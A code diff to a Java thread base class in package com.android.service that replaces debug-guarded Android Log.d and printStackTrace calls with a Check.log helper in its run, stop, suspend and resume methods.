@@ -9,9 +9,8 @@ package com.android.service;
 
 import java.nio.ByteBuffer;
 
-import android.util.Log;
-
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -69,20 +68,20 @@ public abstract class ThreadBase {
 			status = StateRun.STARTED;
 			loop();
 		} catch (Exception ex) {
-			if(Cfg.DEBUG) { ex.printStackTrace(); }
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex);
+			if(Cfg.DEBUG) { Check.log(ex); }
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex);
 		}
 
 		try {
 			status = StateRun.STOPPING;
 			end();
 		} catch (Exception ex) {
-			if(Cfg.DEBUG) { ex.printStackTrace(); }
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex);
+			if(Cfg.DEBUG) { Check.log(ex); }
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex);
 		}
 
 		status = StateRun.STOPPED;
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " AgentBase stopped");
+		if(Cfg.DEBUG) Check.log( TAG + " AgentBase stopped");
 	}
 
 	/**
@@ -119,7 +118,7 @@ public abstract class ThreadBase {
 				}
 			}
 		} catch (Exception ex) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex.toString());
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
 		}
 
 		stopRequest = false;
@@ -184,12 +183,12 @@ public abstract class ThreadBase {
 	boolean suspended;
 
 	public synchronized void suspend() {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (suspend)");
+		if(Cfg.DEBUG) Check.log( TAG + " (suspend)");
 		suspended = true;
 	}
 
 	public synchronized void resume() {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (resume)");
+		if(Cfg.DEBUG) Check.log( TAG + " (resume)");
 		suspended = false;
 		next();
 	}
